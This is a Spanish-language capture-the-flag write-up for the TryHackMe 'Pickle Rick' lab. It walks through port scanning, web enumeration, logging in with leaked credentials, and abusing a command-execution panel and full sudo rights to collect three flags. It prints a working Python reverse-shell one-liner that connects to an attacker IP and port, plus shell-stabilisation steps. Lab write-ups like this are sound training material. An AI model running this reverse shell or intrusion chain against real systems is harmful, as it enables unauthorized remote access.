---
layout: post
author: Isui
title: Pickle Rick - TryHackMe
---
![Banner Pickle RIck](/images/pickle_rick/portadas-writeups.gif "Banner")

#Enumeration #EnumNmap #DirectoryList #ReverShellPython
# Reconocimiento
Ping:
```
ping -c 1 10.10.42.81
```
Escaneo de puertos con `nmap`:
```
sudo nmap -p- --open -sSCV --min-rate 1000 -n -Pn 10.10.42.81 -oG primerEscaneo
```
Resultado:
```
┌──(isui㉿kali)-[~/TryHackMe/pickle_rick]
└─$ sudo nmap -p- --open -sS --min-rate 1000 -n -vv -Pn 10.10.42.81 -oG primerEscaneo
[sudo] password for isui: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 00:26 CST
Initiating SYN Stealth Scan at 00:26
Scanning 10.10.42.81 [65535 ports]
Discovered open port 22/tcp on 10.10.42.81
Discovered open port 80/tcp on 10.10.42.81
Completed SYN Stealth Scan at 00:26, 45.81s elapsed (65535 total ports)
Nmap scan report for 10.10.42.81
Host is up, received user-set (0.15s latency).
Scanned at 2024-06-24 00:26:01 CST for 46s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 45.91 seconds
           Raw packets sent: 70217 (3.090MB) | Rcvd: 70166 (2.807MB)                     
┌──(isui㉿kali)-[~/TryHackMe/pickle_rick]
└─$                     
```
![](/images/pickle_rick/Pasted image 20240624002947.png)

Escaneo exhaustivo de puertos:
```
sudo nmap -p22,80 -sCV 10.10.42.81 -A -oN target
```
Resultado:
```
┌──(isui㉿kali)-[~/TryHackMe/pickle_rick]
└─$ sudo nmap -p22,80 -sCV 10.10.42.81 -A -oN target                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 00:31 CST
Nmap scan report for 10.10.42.81
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7b:9b:fa:02:92:71:5c:2b:3c:b7:b1:ab:b2:22:ce:c0 (RSA)
|   256 50:b0:9a:d0:a7:37:08:20:06:a6:47:d7:8f:59:1d:8d (ECDSA)
|_  256 74:bf:33:5b:dc:6a:94:16:22:9e:1d:9c:b6:d9:d8:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   146.48 ms 10.21.0.1
2   146.63 ms 10.10.42.81

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.69 seconds
┌──(isui㉿kali)-[~/TryHackMe/pickle_rick]
└─$ 
```

![](/images/pickle_rick/Pasted image 20240624003356.png)

En base a la versión del servicio SSH, se puede inferir que se trata de un SO Ubuntu Focal:

![](/images/pickle_rick/Pasted image 20240624003540.png)

## Servicio HTTP
Desde el navegador, se visualiza un pagina con algunos indicios:

![](/images/pickle_rick/Pasted image 20240624003806.png)

Para ver a detalle la página se utilizo la herramienta `curl`:
```
curl -s -X GET http://10.10.42.81
```

El comando `curl -s -X GET http://10.10.42.81` hace lo siguiente:

- Realiza una solicitud HTTP `GET` a la dirección `http://10.10.42.81`.
- La opción `-s` suprime la salida del progreso y cualquier mensaje de error, mostrando solo el contenido de la respuesta del servidor.
- Dado que `GET` es el método predeterminado de `curl`, la opción `-X GET` no es necesaria, pero explícitamente indica que se está haciendo una solicitud `GET`.
#### Uso Común
Este comando es útil cuando deseas obtener datos desde un servidor específico y prefieres una salida limpia y sin ruido. Esto puede ser útil para integraciones en scripts, donde solo te interesa el contenido de la respuesta sin mensajes adicionales.

Al realizar este reconocimiento, se expuso en el código HTML, un comentario que contiene un potencial usuario:
```
########
```

![](/images/pickle_rick/Pasted image 20240624004334.png)

# Enumeración 
Las tecnologias utilizadas se enumerarón con la herramienta  `whatweb`:
```
whatweb http://10.10.42.81
```

![](/images/pickle_rick/Pasted image 20240624004922.png)

Con la herramientas Nmap y Dirb se realizo la enumeración de posibles directorios:
**nmap**:
```
sudo nmap --script http-enum -p80 10.10.42.81 -oN webScan
```

![](/images/pickle_rick/Pasted image 20240624004659.png)


>**NOTA IMPORTANTE DEL CTF**  
>A partir de este momento, tuve que reiniciar la máquina en TryHackMe por problemas de conexión, así que cambio la dirección a la: `10.10.101.174`, pero la metodología es la misma.


Escaneo de directorios con Dirb:
```
dirb http://10.10.101.174
```



Una vez con estos resultados, se busco en el navegador dichos directorios:
**/assets/**

![](/images/pickle_rick/Pasted image 20240624110637.png)

**/robots.txt**

![](/images/pickle_rick/Pasted image 20240624110743.png)

**/login.php**

![](/images/pickle_rick/Pasted image 20240624111837.png)

Al visualizar estos archivos y rutas del sistema, se nota que el archivo **robots.txt** no contiene el texto que comúnmente debería de tener. Por lo que se decidió guardar dicha información con el comando:

```
curl -s -X GET http://10.10.101.174 -o robots.txt
```

Se busco intentar métodos de SQLI en el Login, pero se tuvo éxito :

![](/images/pickle_rick/Pasted image 20240624112445.png)

Luego, se probo con una combinación de las posibles credenciales obtenidas durante el reconocimiento:

![](/images/pickle_rick/Pasted image 20240624112840.png)

Esta acción permitió ingresar al aplicativo:

![](/images/pickle_rick/Pasted image 20240624112921.png)

Dentro de esté aplicativo, se listan una serie de demás páginas, a las que se intento acceder, pero fue denegado el servicio:

![](/images/pickle_rick/Pasted image 20240624113109.png)

Esté aplicativo contaba con una gran vulnerabilidad. La ejecución de comandos:

![](/images/pickle_rick/Pasted image 20240624113401.png)

Se listaron los archivos dentro del directorio actual:

![](/images/pickle_rick/Pasted image 20240624114711.png)

Mediante el comando no fue posible visualizar algunos archivos, asi que se busco que sea mediante la herramienta `curl`:
```
curl -s -X GET http://ip/recurso
```

![](/images/pickle_rick/Pasted image 20240624115822.png)

Se muestra lo que parece ser una primer bandera.

Para seguir con la intrusión, el archivo `clue.txt` menciona que dentro del sistema se encuentran otros ingredientes.

Mediante el comando:
```
grep -R ""
```
Se busco listar todo el contenido posible, para ver si encontraba algo más que no estuviera expuesto a primera vista. El resultado fue:

![](/images/pickle_rick/Pasted image 20240624120813.png)

Con este resultado no se obtuvo más visibilidad del aplicativo, pero aun quedaba intentar escalar privilegios. Primero se intento crear una conexión `Reverse Shell & Bind Shell`, pero no se obtuvo exito, por lo que se intento realizar una conexión mediante `oneliner php & python`, pero tampoco se obtuvo exito.

Por lo que se intento mediante el aplicativo escalar privilegios con el comando:
```
sudo -l
```
Obteniendo lo siguiente:

![](/images/pickle_rick/Pasted image 20240624121327.png)

**Ejemplo de Salida:**
Supongamos se que ejecuta `sudo -l` y se obtuvo una salida como la siguiente:
`User isui may run the following commands on hostname:     (ALL : ALL) ALL     (root) NOPASSWD: /usr/bin/apt-get update`
Esta salida indica que:

1. **`(ALL : ALL) ALL`**:
     - El usuario `isui` puede ejecutar cualquier comando como cualquier usuario en el sistema, utilizando `sudo`.
2. **`(root) NOPASSWD: /usr/bin/apt-get update`**:
	*  El usuario `isui` puede ejecutar el comando `/usr/bin/apt-get update` como `root` sin necesidad de proporcionar una contraseña.


Una vez sabiendo que se pueden ejecutar comando como super usuario, se listo la ruta del directorio actual:

![](/images/pickle_rick/Pasted image 20240624121820.png)

Mediante el comando `ls` con permisos de root, se listaron todos los directorios del equipo, para ver si se podia extraer información valiosa:
```
sudo ls ../../../*
```

![](/images/pickle_rick/Pasted image 20240624122125.png)

Este listado de directorios, dio la visibilidad del directorio rick, que es de nuestro interés gracias a los usuarios recabados hasta este momento:

![](/images/pickle_rick/Pasted image 20240624122243.png)

De igual manera, este listado de directorios, dio la pista para revisar el contenido de un archivo inusual en el directorio del usuario root:

![](/images/pickle_rick/Pasted image 20240624122446.png)

El primer directorio que se listo fue el del usuario rick:
```
sudo ls -la ../../../home/rick
```

![](/images/pickle_rick/Pasted image 20240624122700.png)

Se intento listar desde el aplicativo pero no fue posible, entonces se intento nuevamente establecer una conexión `reverse shell` con Python:
```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.16.176",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

![](/images/pickle_rick/Pasted image 20240624130454.png)

> Nota: Después de repetidos intentos fallidos, la solución fue colocar `python3` porque el target solo ejecuta esta versión de Python.

Esto genero una conexión, pero no una shell interactiva:

![](/images/pickle_rick/Pasted image 20240624125620.png)

Por lo que se ejecuto el comando:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Luego se realizo un tratamiento de la TTY:

Ingresar el comando (en nuestra terminal de atacante de Kali):
```
script /dev/null -c bash
```
Pulsar la combinación: `ctrl + z`
Escribir el comando:
```
stty raw -echo; fg
```
Pulsar `Enter` y escribir:
```
reset xterm
```
Escribir:
```
export TERM=xterm
```
Ahora debemos colocar nuestra terminal en pantalla completa para trabajar más comodo en caso de comandos muy largos:
```
stty rows 30 columns 100
```

Hemos terminado el tratamiento de nuestra terminal interactiva.

![](/images/pickle_rick/Pasted image 20240624130043.png)

Una vez con la shell tratada, ahora se exploraron los archivos:

![](/images/pickle_rick/Pasted image 20240624130152.png)

Con esta información se obtuvo acceso a la segunda bandera.

Para la tercer bandera se busco en el directorio del usuario ROOT, gracias a la información ya antes recolectada:

![](/images/pickle_rick/Pasted image 20240624130713.png)

Y así se terminó este CTF, gracias por llegar aquí!

---------------------------------------------------

tHanks f0r read1ng w1th L0v3 Isu <3

And H4ppy H4cking!